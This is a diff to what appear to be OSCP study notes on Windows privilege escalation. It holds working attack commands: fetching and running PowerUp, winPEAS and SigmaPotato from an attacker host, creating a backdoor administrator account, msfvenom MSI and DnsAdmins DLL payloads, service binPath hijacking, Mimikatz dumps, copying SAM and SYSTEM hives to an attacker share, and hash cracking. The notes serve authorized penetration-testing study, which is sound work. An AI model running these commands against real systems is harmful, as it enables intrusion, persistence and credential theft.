@@ -16,7 +16,7 @@ whoami /groups
 net user
 net localgroup
 net localgroup Administrators
-net user <username>
+net user $Username
 
 # System info
 systeminfo
@@ -85,11 +85,11 @@ Get-ChildItem -Path C:\Users\ -Recurse -Include *.kdbx,*.rdg,*.vnc,*.rdp,*.cred,
 
 ```powershell
 # winPEAS
-iwr -uri http://<kali-ip>/winPEASx64.exe -OutFile winPEAS.exe
+iwr -uri http://$LocalIP/winPEASx64.exe -OutFile winPEAS.exe
 .\winPEAS.exe | Tee-Object -FilePath winpeas_out.txt
 
 # PowerUp
-IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/PowerUp.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/PowerUp.ps1')
 Invoke-AllChecks
 # Individual checks:
 Get-ModifiableServiceFile     # binary is writable
@@ -97,7 +97,7 @@ Get-UnquotedService           # unquoted path + writable dir
 Get-ModifiableService         # service config writable (binPath)
 
 # Seatbelt
-iwr -uri http://<kali-ip>/Seatbelt.exe -OutFile Seatbelt.exe
+iwr -uri http://$LocalIP/Seatbelt.exe -OutFile Seatbelt.exe
 .\Seatbelt.exe -group=all
 .\Seatbelt.exe DpapiMasterKeys InstalledProducts PowerShellHistory
 ```
@@ -295,12 +295,12 @@ Note: needs write access to `C:\Users\Public\`. If denied over WinRM, try from a
 whoami /priv   # confirm SeImpersonatePrivilege Enabled
 
 # SigmaPotato (modern, no CLSID needed, works Win10/11/2019/2022)
-iwr -uri http://<kali-ip>/SigmaPotato.exe -OutFile SigmaPotato.exe
+iwr -uri http://$LocalIP/SigmaPotato.exe -OutFile SigmaPotato.exe
 .\SigmaPotato.exe "net user hacker Passw0rd! /add"
 .\SigmaPotato.exe "net localgroup Administrators hacker /add"
 
 # Then connect as hacker:
-evil-winrm -i <target-ip> -u hacker -p Passw0rd!
+evil-winrm -i $BoxIP -u hacker -p Passw0rd!
 ```
 
 ---
@@ -336,7 +336,7 @@ msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi -o shell.msi
 python3 -m http.server 8080
 ```
 ```cmd
-msiexec /quiet /qn /i \\<kali-ip>\share\shell.msi
+msiexec /quiet /qn /i \\$LocalIP\share\shell.msi
 # Or after downloading:
 msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
@@ -405,7 +405,7 @@ Inside Mimikatz:
 log
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
-:: Look for: * NTLM : <hash> under each user's entry
+:: Look for: * NTLM : $AdminHash under each user's entry
 ```
 
 See [[17. Windows Privilege Escalation|WPE.5]], [[16. Password Attacks#Mimikatz|Mimikatz appendix]].
@@ -426,7 +426,7 @@ Import-Module .\Enable-Privilege.ps1
 takeown /f 'C:\path\to\file.txt'
 
 :: Grant yourself read/write (ownership alone doesn't give read access)
-icacls 'C:\path\to\file.txt' /grant <username>:F
+icacls 'C:\path\to\file.txt' /grant $Username:F
 
 :: Read the file
 cat 'C:\path\to\file.txt'
@@ -479,7 +479,7 @@ wevtutil qe Security /rd:true /f:text | Select-String "password"
 wevtutil qe Security /rd:true /f:text /q:"*[System[EventID=4688]]" | Select-String "/pass"
 ```
 
-Look for: `net use /user:<user> <pass>`, `cmdkey /add: /user: /pass:`, `runas /user: ...`.
+Look for: `net use /user:$Username $Password`, `cmdkey /add: /user: /pass:`, `runas /user: ...`.
 
 See [[17. Windows Privilege Escalation|WPE.8]].
 
@@ -491,14 +491,14 @@ See [[17. Windows Privilege Escalation|WPE.8]].
 
 ```bash
 # Step 1: craft a DLL payload on attack box
-msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
+msfvenom -p windows/x64/exec cmd='net group "domain admins" $Username /add /domain' -f dll -o adduser.dll
 python3 -m http.server 7777
 ```
 
 ```cmd
 :: Step 2: on target (as DnsAdmins member), download and load the DLL
 wget "http://PWNIP:7777/adduser.dll" -outfile "adduser.dll"
-dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\adduser.dll
+dnscmd.exe /config /serverlevelplugindll C:\Users\$Username\adduser.dll
 
 :: Step 3: restart DNS to trigger DLL load (service may fail to start — payload still runs)
 sc stop dns
@@ -524,7 +524,7 @@ sc qc AppReadiness
 :: Confirms: SERVICE_START_NAME : LocalSystem
 
 :: Step 2: change its binary to a command that adds your user to local Admins
-sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators $Username /add"
 
 :: Step 3: start the service (will fail with 1053 — expected, payload still runs)
 sc start AppReadiness
@@ -549,7 +549,7 @@ cd C:\Users
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 
 ## Sticky Notes (plum.sqlite) — requires PSSQLite module
-$db = 'C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+$db = 'C:\Users\$Username\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
 Import-Module C:\Tools\PSSQLite\PSSQLite.psd1
 Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
@@ -631,7 +631,7 @@ copy "C:\Users\<victim>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-relea
 
 ```bash
 # On attack box: extract session cookie for target domain
-python3 cookieextractor.py --dbpath cookies.sqlite --host <domain>
+python3 cookieextractor.py --dbpath cookies.sqlite --host $Domain
 # Output: cookie name and value
 ```
 
@@ -653,11 +653,11 @@ restic.exe -r E:\restic snapshots
 # Enter repo password when prompted
 
 ## Restore a specific snapshot
-restic.exe -r E:\restic restore <snapshot-id> --target C:\Users\<user>\Restore
+restic.exe -r E:\restic restore <snapshot-id> --target C:\Users\$Username\Restore
 
 ## Copy hive files to attacker SMB share
-copy C:\Users\<user>\Restore\C\Windows\System32\config\SAM \\PWNIP\share\
-copy C:\Users\<user>\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
+copy C:\Users\$Username\Restore\C\Windows\System32\config\SAM \\PWNIP\share\
+copy C:\Users\$Username\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
 ```
 
 ```bash
@@ -788,7 +788,7 @@ C:\path\to\pwdump8.exe
 
 ```bash
 # Crack NTLM hashes offline
-hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 $AdminHash /usr/share/wordlists/rockyou.txt
 ```
 
 Alternative when you have SYSTEM meterpreter: `hashdump` built-in.
@@ -812,12 +812,12 @@ SysaxAutomation is a Windows automation tool with a service running as SYSTEM. I
 1. Create a batch payload in a writable directory (e.g., `%USERPROFILE%\Documents\pwn.bat`):
 
 ```cmd
-net localgroup administrators <USERNAME> /add
+net localgroup administrators $Username /add
 ```
 
 2. Open `sysaxschedscp.exe` → Setup Scheduled/Triggered Tasks → Add task (Triggered).
 3. Set:
-   - Folder to Monitor: a directory the current user controls (e.g., `C:\Users\<user>\Documents\`)
+   - Folder to Monitor: a directory the current user controls (e.g., `C:\Users\$Username\Documents\`)
    - Check: "Run task if a file is added to the monitor folder or subfolder(s)"
    - Program to run: full path to `pwn.bat`
    - Uncheck "Login as the following user to run task" (runs as SYSTEM if unchecked)
@@ -843,3 +843,14 @@ See [[27. Assembling the Pieces|AEN.8 Q3]] for the full example.
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/17. Windows Privilege Escalation]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- demonstrates the workflow described here
